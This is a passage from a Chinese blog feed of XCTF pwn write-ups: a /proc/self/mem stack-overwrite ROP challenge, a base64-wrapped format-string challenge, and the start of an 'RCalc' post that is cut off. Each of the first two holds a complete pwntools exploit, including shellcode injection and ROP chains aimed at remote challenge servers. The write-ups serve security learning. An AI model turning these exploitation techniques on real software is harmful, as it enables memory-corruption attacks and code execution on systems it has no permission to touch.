title="利用分析"></a>利用分析</h3><p>利用读取任意文件读取/proc/self/maps然后获得程序加载基地址，再者就是获取自己创建的映射关系</p><p><img src="/images/image-20220105125620177.png" alt="image-20220105125620177"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">find(<span class="string">b&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line">get()</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;You get something:\n&#x27;</span>)</span><br><span class="line">process_base = <span class="built_in">int</span>(r.recvuntil(<span class="string">b&#x27;-&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;process_base:&quot;</span>+<span class="built_in">hex</span>(process_base))</span><br><span class="line"></span><br><span class="line">puts_addr = process_base+puts_plt</span><br><span class="line">read_addr = process_base+read_plt</span><br><span class="line">open_addr = process_base+open_plt</span><br><span class="line">pop_rdi_addr = process_base+pop_rdi</span><br><span class="line">pop_rsi_r15_addr = process_base+pop_rsi_r15</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;[heap]\n&#x27;</span>)</span><br><span class="line">stack_arr = <span class="built_in">str</span>(r.recvuntil(<span class="string">b&#x27; rw-p &#x27;</span>, drop=<span class="literal">True</span>), encoding=<span class="string">&#x27;utf-8&#x27;</span>).split(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(stack_arr)</span><br><span class="line">stack_start = <span class="built_in">int</span>(stack_arr[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;stack_start:&quot;</span>+<span class="built_in">hex</span>(stack_start))</span><br><span class="line">stack_end = <span class="built_in">int</span>(stack_arr[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stack_start:&quot;</span>+<span class="built_in">hex</span>(stack_start))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stack_end:&quot;</span>, <span class="built_in">hex</span>(stack_end))</span><br></pre></td></tr></table></figure><p>接着思路就是利用mem劫持执行流，但是在看ida的代码</p><p><img src="/images/image-20220105125954789.png" alt="image-20220105125954789"></p><p>程序都是以exit(0)结束，导致在fn我们无法进行ROP。所以思路就是我们覆盖掉read函数的ret地址来进行ROP。</p><p>首先需要确定read的ret地址，但是我们连这个上面存放的什么都不知道所以很难操作，所以我们选择寻找buf的位置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">find(<span class="string">b&#x27;/proc/self/mem&#x27;</span>)</span><br><span class="line">locate(stack_start)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    get()</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You get something:\n&#x27;</span>)<span class="comment"># 这一句千万别忘了，我就是忘了找一句导致一直跑不出来。</span></span><br><span class="line">    content = r.recvuntil(<span class="string">b&#x27;\n1.Find something&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;/proc/self/mem&#x27;</span> <span class="keyword">in</span> content:</span><br><span class="line">        success(<span class="string">&#x27;OK!!!&#x27;</span>)</span><br><span class="line">        buf_addr = <span class="built_in">len</span>(content.split(<span class="string">b&#x27;/proc/self/mem&#x27;</span>)</span><br><span class="line">                       [<span class="number">0</span>])+i*<span class="number">100000</span>+stack_start</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> i==<span class="number">23</span>:</span><br><span class="line">        log.failure(<span class="string">&#x27;NO!!!&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>其实buf地址的计算式很好就可以理解。</p><p>但是光知道buf地址我们还是没法进行ROP。所以下一步就是求read的ret地址</p><p><img src="/images/image-20220105130535973.png" alt="image-20220105130535973"></p><p>可以看到buf距离rsp的地址其实是0x30，但是在执行call _read指令时会执行push ip这条命令，执行完ret也就是pop ip。所以push进去之后rsp又会降低8个字节。所以此时read的ret地址距离buf的地址是0x38(以上是我个人对于0x38的猜测，因为其他博客并没有说清楚，可能是觉得太简单了，有错误欢迎大家在下方留言评论)。</p><p>所以获得ret地址的代码也就是在上面加点小改动</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">find(<span class="string">b&#x27;/proc/self/mem&#x27;</span>)</span><br><span class="line">locate(stack_start)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    get()</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You get something:\n&#x27;</span>)</span><br><span class="line">    content = r.recvuntil(<span class="string">b&#x27;\n1.Find something&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;/proc/self/mem&#x27;</span> <span class="keyword">in</span> content:</span><br><span class="line">        success(<span class="string">&#x27;OK!!!&#x27;</span>)</span><br><span class="line">        buf_addr = <span class="built_in">len</span>(content.split(<span class="string">b&#x27;/proc/self/mem&#x27;</span>)</span><br><span class="line">                       [<span class="number">0</span>])+i*<span class="number">100000</span>+stack_start</span><br><span class="line">        ret_addr = buf_addr-<span class="number">0x38</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">23</span>:</span><br><span class="line">        log.failure(<span class="string">&#x27;NO!!!&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>最后就是利用任意地址写构建ROP了，但是程序禁止了execve所以没法system这种了，选择open-&gt;read-&gt;puts就好了</p><p><img src="/images/image-20220105131207055.png" alt="image-20220105131207055"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./cab92757a3ca4246a7a7eb7c880e20d9&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./cab92757a3ca4246a7a7eb7c880e20d9&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>, <span class="number">50398</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000001823</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000001821</span></span><br><span class="line">open_plt = elf.plt[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span>(<span class="params">name</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;5.Exit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;So man, what are you finding?&#x27;</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">locate</span>(<span class="params">pos</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;5.Exit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;So, Where are you?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(pos), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;5.Exit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;How many things do you want to get?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;100000&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">give</span>(<span class="params">content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;5.Exit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Do you want to help me build my room? Y/n?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">find(<span class="string">b&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line">get()</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;You get something:\n&#x27;</span>)</span><br><span class="line">process_base = <span class="built_in">int</span>(r.recvuntil(<span class="string">b&#x27;-&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;process_base:&quot;</span>+<span class="built_in">hex</span>(process_base))</span><br><span class="line"></span><br><span class="line">puts_addr = process_base+puts_plt</span><br><span class="line">read_addr = process_base+read_plt</span><br><span class="line">open_addr = process_base+open_plt</span><br><span class="line">pop_rdi_addr = process_base+pop_rdi</span><br><span class="line">pop_rsi_r15_addr = process_base+pop_rsi_r15</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;[heap]\n&#x27;</span>)</span><br><span class="line">stack_arr = <span class="built_in">str</span>(r.recvuntil(<span class="string">b&#x27; rw-p &#x27;</span>, drop=<span class="literal">True</span>), encoding=<span class="string">&#x27;utf-8&#x27;</span>).split(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(stack_arr)</span><br><span class="line">stack_start = <span class="built_in">int</span>(stack_arr[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;stack_start:&quot;</span>+<span class="built_in">hex</span>(stack_start))</span><br><span class="line">stack_end = <span class="built_in">int</span>(stack_arr[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stack_start:&quot;</span>+<span class="built_in">hex</span>(stack_start))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stack_end:&quot;</span>, <span class="built_in">hex</span>(stack_end))</span><br><span class="line"></span><br><span class="line">find(<span class="string">b&#x27;/proc/self/mem&#x27;</span>)</span><br><span class="line">locate(stack_start)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    get()</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You get something:\n&#x27;</span>)</span><br><span class="line">    content = r.recvuntil(<span class="string">b&#x27;\n1.Find something&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;/proc/self/mem&#x27;</span> <span class="keyword">in</span> content:</span><br><span class="line">        success(<span class="string">&#x27;OK!!!&#x27;</span>)</span><br><span class="line">        buf_addr = <span class="built_in">len</span>(content.split(<span class="string">b&#x27;/proc/self/mem&#x27;</span>)</span><br><span class="line">                       [<span class="number">0</span>])+i*<span class="number">100000</span>+stack_start</span><br><span class="line">        ret_addr = buf_addr-<span class="number">0x38</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">23</span>:</span><br><span class="line">        log.failure(<span class="string">&#x27;NO!!!&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">find(<span class="string">b&#x27;/proc/self/mem&#x27;</span>.ljust(<span class="number">0x18</span>, <span class="string">b&#x27;\x00&#x27;</span>)+p64(ret_addr))</span><br><span class="line">flag_addr = ret_addr+<span class="number">8</span>*<span class="number">15</span></span><br><span class="line"></span><br><span class="line">payload = p64(pop_rdi_addr)+p64(flag_addr)+p64(pop_rsi_r15_addr) + \</span><br><span class="line">    p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(open_addr)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_addr)+p64(<span class="number">6</span>)+p64(pop_rsi_r15_addr) + \</span><br><span class="line">    p64(flag_addr)+p64(<span class="number">0</span>)+p64(read_addr)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_addr)+p64(flag_addr)+p64(puts_addr)</span><br><span class="line">payload += <span class="string">b&#x27;/home/ctf/flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">give(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h3><p><a class="link"   href="https://blog.csdn.net/getsum/article/details/104096038" >https://blog.csdn.net/getsum/article/details/104096038<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;proc&quot;&gt;&lt;a href=&quot;#proc&quot; class=&quot;headerlink&quot; title=&quot;/proc&quot;&gt;&lt;/a&gt;/proc&lt;/h3&gt;&lt;p&gt;Linux 内核提供了一种通过 /proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc文件系统</summary>
      
    
    
    
    <category term="pwn-xctf" scheme="https://cv196082.gitee.io/categories/pwn-xctf/"/>
    
    
    <category term="/proc" scheme="https://cv196082.gitee.io/tags/proc/"/>
    
  </entry>
  
  <entry>
    <title>nobug</title>
    <link href="https://cv196082.gitee.io/2022/01/01/nobug/"/>
    <id>https://cv196082.gitee.io/2022/01/01/nobug/</id>
    <published>2022-01-01T15:48:00.000Z</published>
    <updated>2022-01-01T16:36:36.988Z</updated>
    
    <content type="html"><![CDATA[<p>以前以为非栈上的格式化字符串应该跟栈上的差不多所以就没怎么去了解，可以说是完全没学非栈上的格式化字符串。</p><h4 id="n"><a href="#n" class="headerlink" title="%n"></a>%n</h4><p><img src="/images/image-20220102000339791.png" alt="image-20220102000339791"></p><p>在上图的红色框中存在一条链假定为p1-&gt;p2-&gt;p3-&gt;p4，我们都知道在gdb中第一列为地址，第二列为值，而第三列则是指针所指向的值。而%n实际上就是修改其第三列，就跟<code>scanf(&quot;%d&quot;,&amp;n);</code>同理。</p><p>所以最终的效果就是我们使用%n修改值修改的是p3。下面回到题目。</p><h3 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h3><p><img src="/images/image-20220102000835128.png" alt="image-20220102000835128"></p><p>几乎什么都没开，重要的是没开nx保护，可以直接写shellcode。这次程序的代码有点长就不放上来了，存在这样一个函数sub_804869D，看起来很复杂还很长，我也不知道是什么看了wp发现是一个base64_decode。</p><h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_8048B76</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v1; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  v1 = sub_804869D(s, v0, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">snprintf</span>(byte_804A8A0, <span class="number">0x800</span>u, <span class="string">&quot;%s&quot;</span>, v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在输入完内容解密之后打印出来还没发现问题。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_8048B32</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v1; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  v1 = sub_804869D(s, v0, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">snprintf</span>(byte_804A8A0, <span class="number">0x800</span>u, v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个函数发现了存在格式化字符串漏洞。但是看了一圈没找到什么地方会往这个函数执行。去看和漏洞函数很相似的上面那个函数的汇编代码的时候发现了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:08048B76 sub_8048B76     proc near               ; CODE XREF: sub_8048BD4+6↓p</span><br><span class="line">.text:08048B76 ; __unwind &#123;</span><br><span class="line">.text:08048B76                 push    ebp</span><br><span class="line">.text:08048B77                 mov     ebp, esp</span><br><span class="line">.text:08048B79                 sub     esp, 18h</span><br><span class="line">.text:08048B7C                 mov     dword ptr [esp], offset s ; s</span><br><span class="line">.text:08048B83                 call    _strlen</span><br><span class="line">.text:08048B88                 mov     dword ptr [esp+8], 0</span><br><span class="line">.text:08048B90                 mov     [esp+4], eax</span><br><span class="line">.text:08048B94                 mov     dword ptr [esp], offset s</span><br><span class="line">.text:08048B9B                 call    sub_804869D</span><br><span class="line">.text:08048BA0                 mov     [esp+0Ch], eax</span><br><span class="line">.text:08048BA4                 mov     dword ptr [esp+8], offset format ; &quot;%s&quot;</span><br><span class="line">.text:08048BAC                 mov     dword ptr [esp+4], 800h ; maxlen</span><br><span class="line">.text:08048BB4                 mov     dword ptr [esp], offset byte_804A8A0 ; s</span><br><span class="line">.text:08048BBB                 call    _snprintf</span><br><span class="line">.text:08048BC0                 push    offset sub_8048BD1</span><br><span class="line">.text:08048BC5                 push    offset sub_8048B32</span><br><span class="line">.text:08048BCA                 push    0</span><br><span class="line">.text:08048BCC                 lea     esp, [esp+4]</span><br><span class="line">.text:08048BD0                 retn</span><br></pre></td></tr></table></figure><p>下面几行会将sub_8048B32推进栈里，然后下面还有个lea正好吧esp改变过去了，所以是一定会去执行sub_8048B32这个函数的。</p><h5 id="在执行完sub-8048B32会发生什么？"><a href="#在执行完sub-8048B32会发生什么？" class="headerlink" title="在执行完sub_8048B32会发生什么？"></a>在执行完sub_8048B32会发生什么？</h5><p><img src="/images/image-20220102002157237.png" alt="image-20220102002157237"></p><p><img src="/images/image-20220102002207649.png" alt="image-20220102002207649"></p><p><img src="/images/image-20220102002215980.png" alt="image-20220102002215980"></p><p>可以看到程序是利用了类似于ROP的思想进行的。</p><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p><img src="/images/image-20220102002547923.png" alt="image-20220102002547923"></p><p>发现疑似可利用的地方，马上调试程序</p><p><img src="/images/image-20220102002730704.png" alt="image-20220102002730704"></p><p> 这就是刚刚找的东西，但是直接利用肯定不行。所以我们要构造出来p1-&gt;p2-&gt;p3的结构</p><p><img src="/images/image-20220102002849166.png" alt="image-20220102002849166"></p><p>很容易可以看到ebp存在这样一条链子，0xffffce08也存在，我们若是让0xffffce08的值等于0xffffce0c那我们岂不是就构成了这样一条链子？</p><p><code>0xffffce08-&gt;0xffffce0c-&gt;0x8048bdf</code>这时候修改0x8048bdf到shellcode的地址就可以了。</p><p>已知ebp为%4$，再结合文章开头所说的，那么我们就可以通过%4$修改%12$的值为%13$，然后利用%12$修改%13$的值为我们的shellcode。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./4f59876cebb1469ca62254c162306aa5&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./4f59876cebb1469ca62254c162306aa5&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>, <span class="number">52730</span>)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">shellcode_addr = <span class="number">0x804A8A0</span></span><br><span class="line"></span><br><span class="line">r.sendline(base64.b64encode(<span class="string">b&#x27;%4$p&#x27;</span>))</span><br><span class="line">ret_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)+<span class="number">4</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ret_addr))</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload = shellcode+<span class="string">b&#x27;%&#x27;</span> + \</span><br><span class="line">    <span class="built_in">bytes</span>(<span class="built_in">str</span>((ret_addr &amp; <span class="number">0xff</span>)-<span class="built_in">len</span>(shellcode)),</span><br><span class="line">          encoding=<span class="string">&#x27;utf8&#x27;</span>)+<span class="string">b&#x27;c%4$hhn%&#x27;</span> + \</span><br><span class="line">    <span class="built_in">bytes</span>(<span class="built_in">str</span>((shellcode_addr &amp; <span class="number">0xff</span>)-(ret_addr &amp; <span class="number">0xff</span>)),</span><br><span class="line">          encoding=<span class="string">&#x27;utf8&#x27;</span>)+<span class="string">b&#x27;c%12$hn&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = base64.b64encode(payload)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a class="link"   href="https://www.cjovi.icu/WP/buu-xman_2019_format-wp.html" >https://www.cjovi.icu/WP/buu-xman_2019_format-wp.html<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;以前以为非栈上的格式化字符串应该跟栈上的差不多所以就没怎么去了解，可以说是完全没学非栈上的格式化字符串。&lt;/p&gt;
&lt;h4 id=&quot;n&quot;&gt;&lt;a href=&quot;#n&quot; class=&quot;headerlink&quot; title=&quot;%n&quot;&gt;&lt;/a&gt;%n&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;/i</summary>
      
    
    
    
    <category term="pwn-xctf" scheme="https://cv196082.gitee.io/categories/pwn-xctf/"/>
    
    
    <category term="格式化字符串" scheme="https://cv196082.gitee.io/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>RCalc</title>
    <link href="https://cv196082.gitee.io/2021/12/26/RCalc/"/>
    <id>https://cv196082.gitee.io/2021/12/26/RCalc/</id>
    <published>2021-12-26T10:18:35.000Z</published>
    <updated>2021-12-26T10:38:12.373Z</updated>
    
    <content type="html"><![CDATA[<h3 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h3><p>今年冲50篇博客看来是悬了，这玩意数论是真要了我的老命了 : (</p><p>是真被xctf搞无语了，有时候环境创建不了就不说，居然题目给的libc版本和解题需要的版本不一致，去问Gyan大神估计都觉得我是个傻逼了。。。</p><p><img src="/images/image-20211226181931393.png" alt="image-20211226181931393"></p><p>只打开了nx</p><h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span 